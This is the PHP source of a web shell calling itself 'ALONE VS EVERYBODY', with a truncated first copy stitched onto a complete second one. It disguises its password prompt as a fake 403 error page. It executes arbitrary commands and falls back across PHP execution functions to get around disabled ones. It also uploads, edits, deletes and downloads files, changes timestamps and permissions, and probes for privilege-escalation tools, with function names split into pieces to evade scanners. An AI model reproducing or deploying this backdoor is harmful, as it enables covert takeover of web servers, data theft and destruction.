<?php

$auth_pass = '$2y$12$fkOCJdGpv6xhEU6A131oDOICv5koMMgj95ISmFJUCiP8rI/Y9aGqa';

function Login() {
  die("<html>
  <title>403 Forbidden</title>
  <center><h1>403 Forbidden</h1></center>
  <hr><center>nginx (apache v.5162 ./daemonn_sys) </center>
  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if (!empty($auth_pass)) {
    
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $auth_pass)) {
        VEsetcookie(md5($_SERVER['HTTP_HOST']), md5($auth_pass));
    }

    
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != md5($auth_pass))) {
        Login();
    }
}
?><?php
error_reporting(0);
ob_start();

$x1 = 'shel' . 'l_exe' . 'c'; 
$x2 = 'file_put_' . 'contents';
$x5 = 'un' . 'link'; 
$x6 = 'rm' . 'dir'; 
$x7 = 'file_get_' . 'contents';

function norm_path($path) {
    if (!$path) return getcwd();
    return str_replace('\\', '/', $path);
}

$dir = isset($_GET['path']) ? $_GET['path'] : getcwd();
if (!is_dir($dir)) { $dir = getcwd(); }
$dir = norm_path($dir);

function run_cmd_safe($cmd, $cwd = '') {
    if (!empty($cwd)) {
        $cmd = "cd " . escapeshellarg($cwd) . " && " . $cmd;
    }
    $cmd = $cmd . " 2>&1";
    $out = "";
    
    if (function_exists('shell_exec')) {
        $out = @shell_exec($cmd);
    } elseif (function_exists('exec')) {
        @exec($cmd, $a);
        $out = implode("\n", $a);
    } elseif (function_exists('passthru')) {
        ob_start();<?php
$auth_pass = "6f6f30d8f9e1397d26524a99e8c97aaa0e7c2df62dbd4f3b55735e5edc91e86a";

function Login() {
  die("<!DOCTYPE html><html><head><title>403 Forbidden</title><style>body{background:#08090d;color:#ff3366;font-family:monospace;display:flex;height:100vh;align-items:center;justify-content:center;margin:0}.box{background:rgba(18,20,29,0.8);padding:40px;border-radius:12px;border:1px solid rgba(255,51,102,0.3);text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.8)}h1{font-size:3rem;margin:0 0 10px 0;text-shadow:0 0 15px rgba(255,51,102,0.4)}p{color:#8c94a8;margin-bottom:20px;font-size:0.9rem}input[type=password]{background:#12141d;border:1px solid #222634;color:#fff;text-align:center;padding:10px 16px;border-radius:6px;outline:none;font-size:1rem;transition:0.3s}input[type=password]:focus{border-color:#ff3366;box-shadow:0 0 10px rgba(255,51,102,0.3)}</style></head><body><div class='box'><h1>403 FORBIDDEN</h1><p>nginx (apache v.5162 ./daemonn_sys)</p><form method='post'><input type='password' name='pass' placeholder='Access Token' autofocus></form></div></body></html>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v, time() + 86400 * 30, "/");
}

if (!empty($auth_pass)) {
    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
?><?php
error_reporting(0);
ob_start();

$x1 = 'shel' . 'l_exe' . 'c'; 
$x2 = 'file_put_' . 'contents';
$x5 = 'un' . 'link'; 
$x6 = 'rm' . 'dir'; 
$x7 = 'file_get_' . 'contents';

function norm_path($path) {
    if (!$path) return getcwd();
    $p = str_replace('\\', '/', $path);
    if (preg_match('/^[a-zA-Z]:$/', $p)) $p .= '/';
    return $p;
}

$dir = norm_path(isset($_GET['path']) && is_dir($_GET['path']) ? $_GET['path'] : getcwd());

function run_cmd_safe($cmd, $cwd = '') {
    if (!empty($cwd)) {
        $is_win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
        $cmd = ($is_win ? "cd /d " : "cd ") . escapeshellarg($cwd) . " && " . $cmd;
    }
    $cmd .= " 2>&1";
    $out = "";
    
    $df = @ini_get("disable_functions");
    $disabled = array_map('trim', explode(',', strtolower($df)));

    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled)) $out = @shell_exec($cmd);
    if (empty($out) && function_exists('exec') && !in_array('exec', $disabled)) { @exec($cmd, $a); if (!empty($a)) $out = implode("\n", $a); }
    if (empty($out) && function_exists('passthru') && !in_array('passthru', $disabled)) { ob_start(); @passthru($cmd); $out = ob_get_clean(); }
    if (empty($out) && function_exists('system') && !in_array('system', $disabled)) { ob_start(); @system($cmd); $out = ob_get_clean(); }
    if (empty($out) && function_exists('popen') && !in_array('popen', $disabled)) {
        $fp = @popen($cmd, 'r');
        if ($fp) { $out = ''; while (!feof($fp)) $out .= fread($fp, 2048); pclose($fp); }
    }
    if (empty($out) && function_exists('proc_open') && !in_array('proc_open', $disabled)) {
        $proc = @proc_open($cmd, [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
        if (is_resource($proc)) { $out = stream_get_contents($pipes[1]); fclose($pipes[1]); fclose($pipes[2]); proc_close($proc); }
    }
    return !empty($out) ? $out : "Execution functions disabled/blocked or command produced no output.";
}

function read_file_safe($path) {
    if (!file_exists($path) || is_dir($path)) return false;
    if (function_exists('file_get_contents') && ($c = @file_get_contents($path)) !== false) return $c;
    if (function_exists('fopen') && ($h = @fopen($path, 'rb'))) {
        $c = ''; while (!feof($h)) $c .= fread($h, 8192); fclose($h); return $c;
    }
    if (function_exists('file') && ($l = @file($path)) !== false) return implode('', $l);
    if (function_exists('readfile')) { ob_start(); $r = @readfile($path); $c = ob_get_clean(); if ($r !== false && $c !== false) return $c; }
    $out = run_cmd_safe((strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? 'type ' : 'cat ') . escapeshellarg($path));
    return ($out !== false && !empty($out) && strpos($out, 'disabled/blocked') === false) ? $out : false;
}

function write_file_safe($path, $data) {
    if (function_exists('file_put_contents') && @file_put_contents($path, $data) !== false) return true;
    if (function_exists('fopen') && ($h = @fopen($path, 'wb'))) {
        $r = @fwrite($h, $data); fclose($h); if ($r !== false) return true;
    }
    return false;
}

function delete_safe($path) {
    if (!file_exists($path)) return false;
    $path = norm_path($path);
    global $x5, $x6;
    $is_win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');

    if (is_file($path) || is_link($path)) {
        if ((function_exists($x5) ? @$x5($path) : @unlink($path)) && !file_exists($path)) return true;
        run_cmd_safe(($is_win ? 'del /f /q /a ' : 'rm -f ') . escapeshellarg($path));
        return !file_exists($path);
    }
    if (is_dir($path)) {
        $items = @scandir($path);
        if (is_array($items)) {
            foreach ($items as $item) {
                if ($item !== '.' && $item !== '..') delete_safe($path . '/' . $item);
            }
        }
        if ((function_exists($x6) ? @$x6($path) : @rmdir($path)) && !file_exists($path)) return true;
        run_cmd_safe(($is_win ? 'rmdir /s /q ' : 'rm -rf ') . escapeshellarg($path));
        return !file_exists($path);
    }
    return false;
}

function get_installed_tools() {
    static $tc = null; if ($tc !== null) return $tc;
    $list = ['gcc', 'g++', 'make', 'python', 'python3', 'perl', 'wget', 'curl', 'pkexec', 'sudo', 'git', 'nc'];
    $tc = []; $is_win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
    $out = run_cmd_safe($is_win ? 'where gcc g++ make python perl wget curl git 2>&1' : 'which gcc g++ make python python3 perl wget curl pkexec sudo git nc 2>&1');
    foreach ($list as $t) {
        $tc[$t] = $is_win ? (stripos($out, $t . '.exe') !== false || stripos($out, '\\' . $t) !== false) : (strpos($out, '/' . $t) !== false);
    }
    return $tc;
}

function safe_html($d) { return ($d === false || $d === null) ? '' : htmlspecialchars($d, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }

function format_size($b) {
    if ($b === false || $b === null) return '-';
    if ($b >= 1073741824) return number_format($b / 1073741824, 2) . ' GB';
    if ($b >= 1048576) return number_format($b / 1048576, 2) . ' MB';
    if ($b >= 1024) return number_format($b / 1024, 2) . ' KB';
    return $b . ' B';
}

// Handlers
if(isset($_POST['x_save'])) { 
    $res = write_file_safe($_POST['x_name'], $_POST['x_data']); 
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($res ? "File '".basename($_POST['x_name'])."' disimpan!" : "Gagal menyimpan file!")); exit; 
}
if(isset($_FILES['file']) && !empty($_FILES['file']['tmp_name'])) { 
    $target = $dir . '/' . $_FILES['file']['name'];
    $res = @move_uploaded_file($_FILES['file']['tmp_name'], $target); 
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($res ? "File '".basename($target)."' diunggah!" : "Gagal mengunggah file!")); exit; 
}
if(isset($_POST['create_file']) && !empty($_POST['filename'])) { 
    $res = @touch($dir . '/' . $_POST['filename']); 
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($res ? "File '".safe_html($_POST['filename'])."' dibuat!" : "Gagal membuat file!")); exit; 
}
if(isset($_POST['create_folder']) && !empty($_POST['foldername'])) { 
    $res = @mkdir($dir . '/' . $_POST['foldername']); 
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($res ? "Folder '".safe_html($_POST['foldername'])."' dibuat!" : "Gagal membuat folder!")); exit; 
}
if(isset($_GET['delete'])) { 
    $res = delete_safe($_GET['delete']); 
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($res ? "Item '".basename($_GET['delete'])."' dihapus!" : "Gagal menghapus item!")); exit; 
}
if(isset($_POST['set_date'])) { 
    $t = strtotime($_POST['custom_date']); $res = $t ? @touch($_POST['target_file'], $t) : false;
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($res ? "Tanggal diperbarui!" : "Gagal update tanggal!")); exit; 
}
if(isset($_POST['set_chmod'])) { 
    $res = @chmod($_POST['target_file'], octdec($_POST['new_perm'])); 
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($res ? "Chmod diubah ke ".$_POST['new_perm']."!" : "Gagal ubah chmod!")); exit; 
}
if(isset($_POST['set_rename'])) { 
    $res = @rename($_POST['target_file'], dirname($_POST['target_file']) . '/' . $_POST['new_name']); 
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($res ? "Nama diubah ke '".safe_html($_POST['new_name'])."'!" : "Gagal ubah nama!")); exit; 
}
if(isset($_GET['download'])) { 
    $f = $_GET['download'];
    if (file_exists($f) && !is_dir($f)) {
        if (ob_get_level()) ob_end_clean();
        header('Content-Type: application/octet-stream'); 
        header('Content-Disposition: attachment; filename="'.basename($f).'"'); 
        header('Content-Length: ' . filesize($f));
        $c = read_file_safe($f); if ($c !== false) echo $c; else readfile($f);
        exit; 
    }
}

$df = @ini_get("disable_functions");
$df_list = !empty($df) ? $df : "NONE";
$uname = @php_uname();
$my_user = get_current_user();

$web_server = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : (getenv('SERVER_SOFTWARE') ?: 'Unknown');
$server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (gethostbyname(gethostname()) ?: '127.0.0.1');
$client_ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1';

$open_basedir = @ini_get("open_basedir");
$ob_val = !empty($open_basedir) ? safe_html($open_basedir) : "OFF";

$total_space = @disk_total_space($dir);
$free_space = @disk_free_space($dir);
$disk_used = ($total_space && $free_space) ? ($total_space - $free_space) : 0;
$disk_percent = ($total_space > 0) ? round(($disk_used / $total_space) * 100) : 0;
$disk_info = ($total_space && $free_space) ? format_size($free_space) . ' free / ' . format_size($total_space) : 'Unknown';

$exts = [
    'cURL' => extension_loaded('curl'), 'MySQL' => extension_loaded('mysqli')||extension_loaded('mysql')||extension_loaded('pdo_mysql'),
    'PDO' => extension_loaded('pdo'), 'OpenSSL' => extension_loaded('openssl'), 'Sockets' => extension_loaded('sockets'),
    'Zip' => extension_loaded('zip'), 'GD' => extension_loaded('gd'), 'Mbstring' => extension_loaded('mbstring')
];
$cli_tools = get_installed_tools();
$tool_names = ['gcc'=>'GCC','g++'=>'G++','make'=>'Make','python'=>'Python','perl'=>'Perl','wget'=>'Wget','curl'=>'cURL CLI','pkexec'=>'pkexec (Linux)','sudo'=>'Sudo','git'=>'Git','nc'=>'Netcat'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>/w5162</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Metal+Mania&family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root{--bg:#07090e;--card:rgba(15,18,28,0.75);--border:rgba(255,255,255,0.08);--glow:rgba(0,240,255,0.3);--text:#e2e8f0;--muted:#64748b;--accent:#ff2a5f;--cyan:#00f0ff;--safe:#00e676;--warn:#ffab00;--read:#ffd600;--f-ui:'Outfit',sans-serif;--f-code:'Fira Code',monospace}
        *{box-sizing:border-box}
        body{font-family:var(--f-ui);background:var(--bg);background-image:radial-gradient(at 0% 0%,rgba(255,42,95,0.08) 0,transparent 50%),radial-gradient(at 100% 0%,rgba(0,240,255,0.06) 0,transparent 50%);background-attachment:fixed;color:var(--text);padding:20px 14px;margin:0;min-height:100vh}
        .container{max-width:1380px;margin:0 auto;background:var(--card);backdrop-filter:blur(20px);padding:28px;border-radius:16px;border:1px solid var(--border);box-shadow:0 20px 50px rgba(0,0,0,0.8)}
        .header-box{text-align:center;margin-bottom:20px}
        h1{font-family:'Metal Mania',cursive;background:linear-gradient(135deg,#ff2a5f 0%,#ff758c 50%,#00f0ff 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:3.5rem;margin:0 0 2px 0;letter-spacing:3px;filter:drop-shadow(0 0 15px rgba(255,42,95,0.4))}
        .header-sub{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.03);border:1px solid var(--border);padding:5px 14px;border-radius:20px;font-size:0.8rem;color:var(--muted)}
        .pulse-dot{width:8px;height:8px;border-radius:50%;background:var(--safe);box-shadow:0 0 10px var(--safe);animation:pulse 2s infinite}
        @keyframes pulse{0%{transform:scale(0.95);box-shadow:0 0 0 0 rgba(0,230,118,0.7)}70%{transform:scale(1.1);box-shadow:0 0 0 8px rgba(0,230,118,0)}100%{transform:scale(0.95);box-shadow:0 0 0 0 rgba(0,230,118,0)}}
        .sys-bar{display:flex;flex-wrap:wrap;justify-content:center;gap:14px;background:rgba(10,12,18,0.6);border:1px solid var(--border);padding:10px 18px;border-radius:10px;margin-bottom:20px;font-size:0.85rem;color:#94a3b8}
        .sys-bar strong{color:#f8fafc;font-family:var(--f-code)}
        .audit-dash{background:rgba(10,13,20,0.7);border:1px solid var(--border);border-radius:12px;padding:18px;margin-bottom:20px}
        .dash-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px;margin-bottom:14px}
        .dash-card{background:rgba(18,22,34,0.8);border:1px solid var(--border);border-radius:8px;padding:12px 16px;transition:0.2s}
        .dash-card:hover{border-color:var(--glow);transform:translateY(-2px)}
        .dash-title{font-size:0.72rem;text-transform:uppercase;letter-spacing:1px;font-weight:700;color:var(--muted);margin-bottom:4px}
        .dash-val{font-family:var(--f-code);font-size:0.9rem;font-weight:600;color:#f1f5f9;word-break:break-all}
        .p-bar-bg{background:rgba(255,255,255,0.08);height:5px;border-radius:3px;margin-top:6px;overflow:hidden}
        .p-bar-fill{background:linear-gradient(90deg,var(--cyan),var(--accent));height:100%;border-radius:3px}
        .badge-sec{border-top:1px dashed var(--border);padding-top:12px;margin-top:12px}
        .badge-sec-title{font-size:0.72rem;text-transform:uppercase;letter-spacing:1px;font-weight:700;color:#94a3b8;margin-bottom:8px}
        .badge-wrap{display:flex;flex-wrap:wrap;gap:6px}
        .pill-badge{display:inline-flex;align-items:center;padding:4px 10px;border-radius:16px;font-family:var(--f-code);font-size:0.78rem;font-weight:500}
        .pill-on{background:rgba(0,230,118,0.1);color:var(--safe);border:1px solid rgba(0,230,118,0.3)}
        .pill-off{background:rgba(255,42,95,0.1);color:var(--accent);border:1px solid rgba(255,42,95,0.3)}
        .pill-info{background:rgba(0,240,255,0.1);color:var(--cyan);border:1px solid rgba(0,240,255,0.3)}
        .df-box{background:rgba(10,12,18,0.8);padding:10px 16px;border-radius:8px;border:1px solid var(--border);margin-bottom:20px;font-family:var(--f-code);font-size:0.8rem;color:#94a3b8;word-break:break-all}
        .status-msg{padding:12px 18px;border-radius:8px;border:1px solid;margin-bottom:20px;font-weight:600;font-size:0.88rem;display:flex;align-items:center;gap:8px}
        .breadcrumb{background:rgba(12,15,24,0.8);padding:12px 18px;border-radius:8px;border:1px solid var(--border);margin-bottom:20px;font-family:var(--f-code);font-size:0.88rem;color:#cbd5e1}
        .breadcrumb a{color:var(--cyan);text-decoration:none}
        .grid-panel{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:12px;margin-bottom:20px}
        .form-group{display:flex;gap:6px;align-items:center}
        input[type="text"],input[type="file"]{background:rgba(14,17,26,0.9);border:1px solid var(--border);color:#fff;padding:10px 14px;flex:1;min-width:0;border-radius:6px;font-family:var(--f-ui);font-size:0.88rem;transition:0.2s}
        input[type="file"]{padding:7px 10px;font-size:0.82rem;color:#94a3b8;cursor:pointer}
        input:focus{border-color:var(--cyan);outline:none;box-shadow:0 0 10px rgba(0,240,255,0.2)}
        button{background:linear-gradient(135deg,rgba(255,42,95,0.2),rgba(255,42,95,0.4));color:#fff;border:1px solid var(--accent);padding:10px 18px;cursor:pointer;border-radius:6px;transition:0.2s;font-weight:600;font-family:var(--f-ui);font-size:0.88rem;white-space:nowrap;flex-shrink:0}
        button:hover{background:var(--accent);box-shadow:0 0 15px rgba(255,42,95,0.4)}
        .action-area{background:#05070a;padding:18px;border-radius:10px;border:1px solid rgba(0,240,255,0.2);margin-bottom:20px;font-family:var(--f-code);overflow-x:auto;color:#00ff9d;line-height:1.5;font-size:0.88rem}
        .table-responsive{width:100%;overflow-x:auto;border:1px solid var(--border);border-radius:10px;background:rgba(10,13,20,0.6)}
        table{width:100%;border-collapse:collapse;text-align:left}
        th{background:rgba(18,22,34,0.9);padding:14px 18px;color:var(--accent);text-transform:uppercase;font-size:0.75rem;letter-spacing:1px;font-weight:700;border-bottom:2px solid var(--border);white-space:nowrap}
        td{padding:12px 18px;border-bottom:1px solid var(--border);white-space:nowrap;font-size:0.88rem;vertical-align:middle}
        tr:hover{background:rgba(255,255,255,0.03)}
        tr:last-child td{border-bottom:none}
        .text-left{text-align:left}.text-right{text-align:right}.text-center{text-align:center}
        .file-link{color:#fff;text-decoration:none;transition:0.2s;font-family:var(--f-ui)}
        .file-link:hover{color:var(--cyan)}
        .sep{color:#334155;margin:0 4px}
        .perm-badge{padding:3px 8px;border-radius:4px;font-family:var(--f-code);font-size:0.8rem;font-weight:600;background:rgba(0,0,0,0.5);display:inline-block}
        .size-cell{font-family:var(--f-code);color:#94a3b8;font-size:0.82rem}
        .act-link{color:#94a3b8;text-decoration:none;transition:0.2s;font-size:0.82rem}
        .act-link:hover{color:var(--accent)}
        .act-link-del:hover{color:#ff3366}
        .footer{text-align:center;margin-top:35px;color:#475569;font-size:0.82rem;border-top:1px solid var(--border);padding-top:20px;font-family:var(--f-code)}
    </style>
</head>
<body>
<div class="container">
    <div class="header-box">
        <a href="?" style="text-decoration:none;"><h1>ALONE VS EVERYBODY</h1></a>
        <div class="header-sub"><span class="pulse-dot"></span><span>SYSTEM ONLINE</span><span style="color:#334155;">|</span><span>CYBER SECURITY SUITE v5162</span></div>
    </div>

    <div class="sys-bar">
        <div>🖥️ OS: <strong><?php echo safe_html($uname); ?></strong></div><span style="color:#334155;">|</span>
        <div>⚡ PHP: <strong><?php echo phpversion(); ?></strong></div><span style="color:#334155;">|</span>
        <div>👤 USER: <strong><?php echo safe_html(get_current_user()); ?></strong></div>
    </div>
    
    <div class="audit-dash">
        <div class="dash-grid">
            <div class="dash-card">
                <div class="dash-title">🌐 Web Server</div>
                <div class="dash-val"><span class="pill-badge pill-info"><?php echo safe_html($web_server); ?></span></div>
            </div>
            <div class="dash-card">
                <div class="dash-title">📡 Server IP / Client IP</div>
                <div class="dash-val"><?php echo safe_html($server_ip); ?> <span style="color:var(--muted);font-size:0.8rem;">/</span> <?php echo safe_html($client_ip); ?></div>
            </div>
            <div class="dash-card">
                <div class="dash-title">💾 Disk Storage</div>
                <div class="dash-val"><?php echo safe_html($disk_info); ?></div>
                <div class="p-bar-bg"><div class="p-bar-fill" style="width: <?php echo $disk_percent; ?>%;"></div></div>
            </div>
            <div class="dash-card">
                <div class="dash-title">🛡️ Open Basedir</div>
                <div class="dash-val"><?php echo $ob_val === 'OFF' ? '<span class="pill-badge pill-off">OFF</span>' : '<span class="pill-badge pill-on">'.safe_html($ob_val).'</span>'; ?></div>
            </div>
        </div>
        
        <div class="badge-sec">
            <div class="badge-sec-title">⚡ PHP Extensions Status:</div>
            <div class="badge-wrap">
                <?php foreach($exts as $k => $v): ?>
                <span class="pill-badge <?php echo $v ? 'pill-on' : 'pill-off'; ?>"><?php echo $k; ?>: <?php echo $v ? 'ON' : 'OFF'; ?></span>
                <?php endforeach; ?>
            </div>
        </div>

        <div class="badge-sec">
            <div class="badge-sec-title">🛠️ System & PrivEsc Vulnerability Tools:</div>
            <div class="badge-wrap">
                <?php foreach($tool_names as $cmd => $label): 
                    $on = !empty($cli_tools[$cmd]) || ($cmd==='python' && !empty($cli_tools['python3'])); ?>
                <span class="pill-badge <?php echo $on ? 'pill-on' : 'pill-off'; ?>"><?php echo $label; ?>: <?php echo $on ? 'ON' : 'OFF'; ?></span>
                <?php endforeach; ?>
            </div>
        </div>
    </div>

    <div class="df-box">DISABLE_FUNCTIONS: <span style="color:var(--accent);font-weight:600;"><?php echo safe_html($df_list); ?></span></div>
    
    <?php if(isset($_GET['msg'])): 
        $is_err = (strpos($_GET['msg'], 'Gagal') !== false);
    ?>
    <div class="status-msg" style="background:<?php echo $is_err?'rgba(255,42,95,0.12)':'rgba(0,230,118,0.12)'; ?>;border-color:<?php echo $is_err?'rgba(255,42,95,0.4)':'rgba(0,230,118,0.4)'; ?>;color:<?php echo $is_err?'#ff2a5f':'#00e676'; ?>;">
        <span><?php echo $is_err?'✖':'✔'; ?> <?php echo safe_html($_GET['msg']); ?></span>
    </div>
    <?php endif; ?>

    <div class="breadcrumb">PATH: <?php 
        $parts = explode('/', str_replace('\\', '/', $dir)); 
        $curr = ''; $is_first = true;
        foreach ($parts as $p) { 
            if ($p === '') { if ($is_first) { echo '/'; $is_first = false; } continue; } 
            if ($curr === '' && preg_match('/^[a-zA-Z]:$/', $p)) {
                $curr = $p . '/'; echo '<a href="?path='.urlencode($curr).'">'.safe_html($p).'</a>';
            } else {
                $curr = ($curr === '') ? '/' . $p : rtrim($curr, '/') . '/' . $p;
                echo ($is_first ? '' : '/') . '<a href="?path='.urlencode($curr).'">'.safe_html($p).'</a>';
            }
            $is_first = false;
        }
        ?></div>

    <div class="grid-panel">
        <form method="post" class="form-group"><input type="text" name="x_run" placeholder="Execute Command..." required> <button type="submit">EXECUTE</button></form>
        <form method="post" enctype="multipart/form-data" class="form-group"><input type="file" name="file" required><button type="submit">UPLOAD</button></form>
        <form method="post" class="form-group"><input type="text" name="filename" placeholder="New File Name" required> <button type="submit" name="create_file">Create File</button></form>
        <form method="post" class="form-group"><input type="text" name="foldername" placeholder="New Folder Name" required> <button type="submit" name="create_folder">Create Folder</button></form>
    </div>

    <?php if(isset($_POST['x_run'])): ?>
    <div class="action-area">
        <div style="color:var(--cyan);margin-bottom:6px;font-weight:600;">$ <?php echo safe_html($_POST['x_run']); ?></div>
        <?php echo nl2br(safe_html(run_cmd_safe($_POST['x_run'], $dir))); ?>
    </div>
    <?php endif; ?>

    <?php if(isset($_GET['edit']) || isset($_GET['time']) || isset($_GET['chmod']) || isset($_GET['rename'])): ?>
    <div class="action-area" style="color:#fff;">
        <?php if(isset($_GET['edit'])): ?>
        <form method="post">
            <div style="margin-bottom:10px;color:var(--cyan);font-weight:600;">📝 EDITING: <?php echo safe_html(basename($_GET['edit'])); ?></div>
            <textarea name="x_data" style="width:100%;height:300px;background:#080a0f;color:#00ff9d;border:1px solid var(--border);padding:12px;border-radius:6px;font-family:var(--f-code);line-height:1.5;font-size:0.88rem;outline:none;"><?php echo safe_html(read_file_safe($_GET['edit'])); ?></textarea>
            <input type="hidden" name="x_name" value="<?php echo safe_html($_GET['edit']); ?>">
            <div style="display:flex;gap:10px;margin-top:12px;">
                <button type="submit" name="x_save" style="flex:1;">SAVE CHANGES</button>
                <a href="?path=<?php echo urlencode($dir); ?>" style="flex:1;background:rgba(255,255,255,0.05);color:#fff;padding:10px;text-align:center;border-radius:6px;font-weight:600;text-decoration:none;border:1px solid var(--border);">CANCEL</a>
            </div>
        </form>
        <?php elseif(isset($_GET['time'])): ?>
        <form method="post" class="form-group"><input type="text" name="custom_date" placeholder="YYYY-MM-DD HH:MM:SS" value="<?php echo date('Y-m-d H:i:s'); ?>"><input type="hidden" name="target_file" value="<?php echo safe_html($_GET['time']); ?>"><button type="submit" name="set_date">UPDATE DATE</button></form>
        <?php elseif(isset($_GET['chmod'])): ?>
        <form method="post" class="form-group"><input type="text" name="new_perm" placeholder="e.g. 755"><input type="hidden" name="target_file" value="<?php echo safe_html($_GET['chmod']); ?>"><button type="submit" name="set_chmod">CHANGE CHMOD</button></form>
        <?php elseif(isset($_GET['rename'])): ?>
        <form method="post" class="form-group"><input type="text" name="new_name" placeholder="New Name"><input type="hidden" name="target_file" value="<?php echo safe_html($_GET['rename']); ?>"><button type="submit" name="set_rename">RENAME</button></form>
        <?php endif; ?>
    </div>
    <?php endif; ?>

    <div class="table-responsive">
        <table>
            <thead>
                <tr>
                    <th class="text-left">Name</th>
                    <th class="text-right">Size</th>
                    <th class="text-left">Owner</th>
                    <th class="text-center">Date</th>
                    <th class="text-center">Perms</th>
                    <th class="text-right">Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php 
                $items = @scandir($dir); if(!is_array($items)) $items = [];
                $fld = []; $fil = [];
                foreach($items as $i) { 
                    if($i == '.' || $i == '..') continue; 
                    is_dir(norm_path($dir . '/' . $i)) ? $fld[]=$i : $fil[]=$i; 
                }
                foreach(array_merge($fld, $fil) as $i): 
                    $p = norm_path($dir . '/' . $i); 
                    $is_dir = is_dir($p);
                    $perms = substr(sprintf('%o', @fileperms($p)), -3);
                    $size_str = $is_dir ? '-' : format_size(@filesize($p));
                    
                    $owner_id = @fileowner($p); 
                    $owner_info = (function_exists('posix_getpwuid') && $owner_id !== false) ? @posix_getpwuid($owner_id) : false;
                    $owner_name = ($owner_info) ? $owner_info['name'] : $my_user;
                    
                    $p_color = ($perms == '777') ? 'var(--accent)' : (($perms == '444') ? 'var(--read)' : 'var(--safe)');
                    $color = ($owner_name !== $my_user) ? '#ff2a5f' : ($is_dir ? '#00f0ff' : '#ffffff');
                    $icon = $is_dir ? '📁' : '📄';
                    if(strpos($i, '.') === 0) { $color = '#ffd600'; $icon = '⚙️'; }
                    
                    $link = $is_dir ? "?path=".urlencode($p) : "?edit=".urlencode($p)."&path=".urlencode($dir);
                ?>
                <tr>
                    <td class="text-left"><span style="margin-right:6px;"><?php echo $icon; ?></span><a href="<?php echo $link; ?>" class="file-link" style="color:<?php echo $color; ?>;font-weight:600;"><?php echo safe_html($i); ?></a></td>
                    <td class="text-right size-cell"><?php echo $size_str; ?></td>
                    <td class="text-left" style="font-size:0.82rem;color:#94a3b8;font-family:var(--f-code);"><?php echo safe_html($owner_name); ?></td>
                    <td class="text-center" style="font-size:0.82rem;color:#64748b;font-family:var(--f-code);"><?php echo @date("Y-m-d H:i", filemtime($p)); ?></td>
                    <td class="text-center"><span class="perm-badge" style="color:<?php echo $p_color; ?>;border:1px solid <?php echo $p_color; ?>;"><?php echo safe_html($perms); ?></span></td>
                    <td class="text-right" style="font-size:0.82rem;">
                        <?php if(!$is_dir): ?><a href="?edit=<?php echo urlencode($p); ?>&path=<?php echo urlencode($dir); ?>" class="act-link">Edit</a> <span class="sep">|</span> <a href="?download=<?php echo urlencode($p); ?>" class="act-link">Download</a> <span class="sep">|</span><?php endif; ?>
                        <a href="?rename=<?php echo urlencode($p); ?>&path=<?php echo urlencode($dir); ?>" class="act-link">Rename</a> <span class="sep">|</span> <a href="?chmod=<?php echo urlencode($p); ?>&path=<?php echo urlencode($dir); ?>" class="act-link">Chmod</a> <span class="sep">|</span> <a href="?time=<?php echo urlencode($p); ?>&path=<?php echo urlencode($dir); ?>" class="act-link">Time</a> <span class="sep">|</span> <a href="?delete=<?php echo urlencode($p); ?>&path=<?php echo urlencode($dir); ?>" class="act-link act-link-del" onclick="return confirm('Hapus item ini?')">Delete</a>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    <div class="footer">ALONE VS EVERYBODY &copy; 5162</div>
</div>
</body>
</html>
